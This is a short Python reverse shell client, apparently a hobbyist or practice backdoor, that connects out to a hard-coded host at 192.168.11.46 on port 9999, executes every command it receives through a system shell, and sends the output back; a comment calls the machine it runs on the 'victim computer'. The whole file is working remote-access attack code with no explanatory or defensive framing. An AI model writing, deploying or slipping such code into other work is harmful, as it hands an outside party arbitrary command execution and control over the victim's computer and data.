import  socket
import os
import sys
import subprocess

s = socket.socket()
host = '192.168.11.46'
port = 9999

s.connect((host, port))

while True:
    server_data = s.recv(1024)
    if server_data.decode('utf8')[:2] == 'cd':
        # print(server_data[2:].decode('utf8'))
        if server_data[2:].decode('utf8'):
            try:
                os.chdir(server_data[3:].decode('utf8'))
            except:
                pass
        else:
            print('error cmd')
    
    if len(server_data)>0:
        # next line is to execute the recvieved cmd from server
        cmd = subprocess.Popen(server_data[:].decode('utf8'),shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,'utf8')
        if len(output_str)==0:
            output_str = 'No significant output '
        
        s.send(str.encode(output_str))
        # cur_dir = os.getcwd() + '>'
        # s.send(str.encode(output_str+cur_dir))

        print(output_str) # to show the output in victim computer